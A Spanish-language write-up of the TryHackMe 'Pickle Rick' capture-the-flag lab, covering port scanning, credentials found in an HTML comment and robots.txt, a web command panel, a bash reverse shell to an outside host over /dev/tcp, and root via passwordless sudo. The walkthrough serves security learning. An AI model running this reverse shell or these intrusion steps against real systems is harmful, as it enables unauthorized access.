# Writeup - Pickle Rick (TryHackMe)

**Máquina:** Pickle Rick  
**Plataforma:** TryHackMe  
**Sistema:** Ubuntu 20.04  
**IP:** 10.130.165.178  
**Objetivo:** Encontrar los 3 ingredientes para la poción

---

## 1. Reconocimiento

```bash
ping -c 4 10.130.165.178
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.130.165.178 -oG all_ports.txt
nmap -p22,80 -sCV -vvv 10.130.165.178 -oN tcp_scan.txt
```

Puertos abiertos:

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 22/tcp | SSH | OpenSSH 8.2p1 Ubuntu |
| 80/tcp | HTTP | Apache httpd 2.4.41 |

---

## 2. Enumeración web

```bash
curl -s http://10.130.165.178/
```

En el código HTML hay un comentario con el usuario:

```html
<!--
  Note to self, remember username!
  Username: R1ckRul3s
-->
```

```bash
curl -s http://10.130.165.178/robots.txt
# Wubbalubbadubdub
```

`robots.txt` contiene una posible contraseña.

```bash
nmap -p80 --script="vuln" -vvv 10.130.165.178
```

El script `http-enum` de nmap revela `/login.php`:

```
| http-enum:
|   /login.php: Possible admin folder
|_  /robots.txt: Robots file
```

---

## 3. Panel de comandos (portal.php)

Accedemos a `http://10.130.165.178/login.php` con:

- **Usuario:** `R1ckRul3s`
- **Contraseña:** `Wubbalubbadubdub`

Nos redirige a `portal.php`, que tiene un campo de ejecución de comandos.

```bash
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

ls -l
# -rwxr-xr-x 1 ubuntu ubuntu   17 Sup3rS3cretPickl3Ingred.txt
```

---

## 4. Primer ingrediente

El comando `cat` está deshabilitado en el panel, pero `less` funciona:

```bash
less Sup3rS3cretPickl3Ingred.txt
```

**Ingrediente 1:** `<REDACTED>`

---

## 5. Reverse shell

```bash
bash -c "bash -i >& /dev/tcp/192.168.129.82/4444 0>&1"
```

Recibimos la shell con **penelope**, que hace el upgrade a PTY automáticamente.

---

## 6. Segundo ingrediente

```bash
cd /home/rick
ls -l
# -rwxrwxrwx 1 root root 13 'second ingredients'
cat 'second ingredients'
```

**Ingrediente 2:** `<REDACTED>`

---

## 7. Escalada a root

El usuario `www-data` puede ejecutar `sudo` sin contraseña:

```bash
sudo su
whoami
# root
```

```bash
cat /root/3rd.txt
```

**Ingrediente 3:** `<REDACTED>`

---

## Resumen

| # | Ingrediente |
|---|-------------|
| 1 | `<REDACTED>` |
| 2 | `<REDACTED>` |
| 3 | `<REDACTED>` |

Laboratorio completado. ¡Rick puede volver a ser humano!
